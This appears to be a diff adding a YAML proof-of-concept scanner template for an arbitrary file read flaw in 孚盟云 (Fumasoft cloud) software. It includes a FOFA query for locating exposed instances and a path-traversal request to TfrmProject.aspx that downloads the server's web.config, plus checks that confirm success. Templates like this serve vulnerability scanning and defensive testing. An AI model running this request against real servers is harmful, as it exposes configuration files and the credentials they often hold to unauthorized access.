@@ -1,0 +1,18 @@
+id: poc-yaml-fumasoft-tfrmproject-anyfile-read
+info:
+  name: 孚盟云 TfrmProject 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 孚盟云
+  fofa: app="孚盟软件-孚盟云"
+requests:
+- method: GET
+  path: /
+  expression: status_code == 200 && contains(body,"孚盟云")
+- method: GET
+  path: /PageStructure/Normal/TfrmProject.aspx?filepath=../../web.config
+  expression: status_code == 200 && contains(body,"</system.web>") && contains(body,"<configuration>")
+    && contains(headers,"filename=web.config") && contains(content_type,"application/octet-stream")
+variables: {}
+transport: http
